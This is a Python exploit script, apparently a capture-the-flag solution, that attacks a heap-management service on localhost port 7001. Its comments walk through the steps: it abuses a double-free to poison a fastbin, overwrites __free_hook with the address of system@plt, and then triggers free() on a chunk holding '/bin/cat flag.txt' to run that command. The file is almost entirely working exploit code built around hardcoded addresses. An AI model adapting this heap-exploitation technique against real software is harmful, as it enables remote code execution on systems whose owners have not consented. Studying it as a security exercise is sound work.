import sys
from struct import pack
from pwn import *
import socket

#COMMANDS 
ALLOC   = b'a'
DEALLOC = b'd'
ONE		= 0x01.to_bytes(1, 'little')
TWO		= 0x02.to_bytes(1, 'little')
THREE	= 0x03.to_bytes(1, 'little')
FOUR 	= 0x04.to_bytes(1, 'little')
RC 		= b"\n"
READLEN = 31
# there is a double free vulnerability: it is possible to call twice deletekey() on the
# same pointer.


# given that RELRO is enabled got entries cannot be overwritten, so the aim of the attack
# is __free_hook. After the attack __free_hook will contain the address of system@plt,  
# the argument will be cmd
cmd 						= b"/bin/cat flag.txt"
free_hook_addr_minus_16 	= 0x605f10
system_plt 					= 0x400e08 
s = socket.create_connection(("localhost",7001))
s.send(ALLOC + ONE + b"B"*READLEN)
s.send(DEALLOC + ONE)
s.send(DEALLOC + ONE)		#free twice on the same pointer in order to create a recursive list on that fastbin,now we are sure that malloc() will return always the same pointer due to fastbin corruption
s.send(ALLOC + TWO   + free_hook_addr_minus_16.to_bytes(8, 'little', signed=False) + RC*23) # this alloc operation will make the next pointer of the first element in the fastbin to __free_hook
s.send(ALLOC + THREE + cmd + RC*(READLEN - len(cmd)))	#this chunk will contain the argument that wiil be given to system() as input
s.send(ALLOC + FOUR  + system_plt.to_bytes(8, 'little', signed=False)  + RC*23) #this malloc will return the address of __free_hook, now it is possible to overwrite it with system() address
s.send(DEALLOC + THREE) # instead of calling free() system() will be called 
print(s.recv(512).decode('ascii'))
s.close()

